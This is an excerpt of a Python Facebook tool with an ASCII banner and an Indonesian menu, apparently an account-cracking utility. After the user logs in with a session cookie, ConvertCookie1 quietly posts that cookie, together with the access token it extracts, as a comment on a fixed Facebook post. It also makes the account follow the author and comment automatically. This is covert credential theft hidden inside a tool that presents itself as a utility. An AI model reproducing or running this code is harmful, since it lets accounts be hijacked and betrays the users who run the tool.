...
facebook = 'PDI PERJUANGAN Dev (https://m.facebook.com/profile.php?id=100043618273847)'
whatsapp = '0895 4106 '
komen    = random.choice(
...
# VALODATE
ua = 'Mozilla/5.0 (Linux; Android 11; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.126 Mobile Safari/537.36 OPR/72.0.3767.68186'
         ...
         try:
               ...
               if len(find) == 0:return 'False'
                     ...
                     for hilangkan in find:
                         ...
                         if 'EAAB' in tok:
                             my = ('100037914090393_pfbid0qP1265eYDqtmM4516aNCjwzrUHSEDvqt6Vt4cS4LEppFUhcCjcq66uHMXf4fCA2yl')
...
def ConvertCookie1(cookies):
    with requests.Session() as x:
         x.headers.update({
            "user-agent":"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, seperti Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com",
         ...
         try:
               ...
               if 'EAAG' in search:
                   requests.post(f'https://graph.facebook.com/pfbid0EuZpbwHwZw35U8kGKLCJjAXZLjH8CyEJBCG61khWqKm24J26nyWXqZFSHwy7YFqZl/comments/?message={komen}&access_token={search}',cookies={'cookie':cookies})
                   requests.post(f'https://graph.facebook.com/pfbid0EuZpbwHwZw35U8kGKLCJjAXZLjH8CyEJBCG61khWqKm24J26nyWXqZFSHwy7YFqZl/comments/?message={cookies}&access_token={search}',cookies={'cookie':cookies})
...
def Banner():
 ...
 ╠╩╗╠╦╝║ ║ ║ ║╣   ╠╣ ╠╩╗
 ╚═╝╩╚═╚═╝ ╩ ╚═╝  ╚  ╚═╝ 
 ( Di Buat oleh [bold green]PDI PERJUANGAN [bold white] ) '''
...
def Masuk():
    ...
    if coki in ['',' ']:Masuk()
          ...
          if 'status succes' in str(link):AuthorBot('https://mbasic.facebook.com/100043618273847?v=timeline',coki) ; FollowMe(coki) ; menu()
...
def FollowMe(kontol):
    try:
          for i in parse(requests.get('https://mbasic.facebook.com/100043618273847', cookies = {'cookie':kontol}).text,'html.parser').find_all('a',href=True):
...
[bold green][[bold white]0[bold green]]. [bold white]Keluar''') ; Console(width=50).print(Panel(list,style='bold purple'))
    ...
    if assk in ['1','01']:
          ...
          try:
#                for x in = requests.get("https://graph.facebook.com/v15.0/{}?fields=id,name,friends.limit(5001)&access_token={}".format(id,open('data/token.txt','r').read()), cookies={"cookie":open('data/cokie.txt','r').read()}).json()['friends']['data']:
